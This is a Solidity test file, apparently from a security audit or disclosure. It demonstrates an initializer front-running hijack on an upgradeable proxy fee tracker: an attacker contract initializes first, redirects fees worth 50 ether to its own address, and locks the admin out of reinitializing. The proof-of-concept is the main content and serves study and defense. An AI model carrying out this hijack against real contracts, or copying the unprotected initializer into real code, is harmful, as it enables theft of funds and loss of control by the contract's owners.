// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {
    BaseF1SimpleProxy,
    BaseF1BalanceTrackerLike,
    BaseF1InitializerAttacker,
    IBalanceTrackerLike
} from "../src/BaseF1InitializerHijackHarness.sol";

interface Vm {
    function deal(address who, uint256 newBalance) external;
    function prank(address msgSender) external;
}

/// @notice Deterministic witness tests for Base F1 initializer hijack.
contract BaseF1InitializerHijackTest {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function test_attacker_can_front_run_initialize_and_capture_fee_flow() public {
        address admin = address(0xA11CE);
        address payable profitWallet = payable(address(0xF00D));
        address payable attackerRecipient = payable(address(0xBEEF));
        address payable feeSource = payable(address(0xC0FFEE));

        BaseF1BalanceTrackerLike implementation = new BaseF1BalanceTrackerLike(profitWallet);
        BaseF1SimpleProxy proxy = new BaseF1SimpleProxy(admin);
        IBalanceTrackerLike tracker = IBalanceTrackerLike(address(proxy));
        BaseF1InitializerAttacker attacker = new BaseF1InitializerAttacker();

        vm.prank(admin);
        proxy.upgradeTo(address(implementation));

        // Unauthorized actor initializes first and points fee routing to attacker.
        attacker.hijack(address(proxy), attackerRecipient, type(uint256).max);

        vm.deal(feeSource, 50 ether);
        vm.prank(feeSource);
        (bool funded,) = address(proxy).call{value: 50 ether}("");
        require(funded, "funding failed");

        tracker.processFees();

        require(attackerRecipient.balance == 50 ether, "attacker did not capture fees");
        require(profitWallet.balance == 0, "profit wallet should receive nothing");
    }

    function test_admin_is_locked_out_after_attacker_first_initialize() public {
        address admin = address(0xA11CE);
        address payable profitWallet = payable(address(0xF00D));
        address payable attackerRecipient = payable(address(0xBEEF));
        address payable legitimateSystemAddress = payable(address(0xCAFE));

        BaseF1BalanceTrackerLike implementation = new BaseF1BalanceTrackerLike(profitWallet);
        BaseF1SimpleProxy proxy = new BaseF1SimpleProxy(admin);
        IBalanceTrackerLike tracker = IBalanceTrackerLike(address(proxy));
        BaseF1InitializerAttacker attacker = new BaseF1InitializerAttacker();

        vm.prank(admin);
        proxy.upgradeTo(address(implementation));

        attacker.hijack(address(proxy), attackerRecipient, type(uint256).max);

        address payable[] memory systemAddresses_ = new address payable[](1);
        systemAddresses_[0] = legitimateSystemAddress;
        uint256[] memory targetBalances_ = new uint256[](1);
        targetBalances_[0] = 1 ether;

        vm.prank(admin);
        (bool ok,) =
            address(proxy).call(abi.encodeWithSelector(IBalanceTrackerLike.initialize.selector, systemAddresses_, targetBalances_));
        require(!ok, "admin unexpectedly reinitialized");

        require(tracker.systemAddresses(0) == attackerRecipient, "attacker config should persist");
    }
}
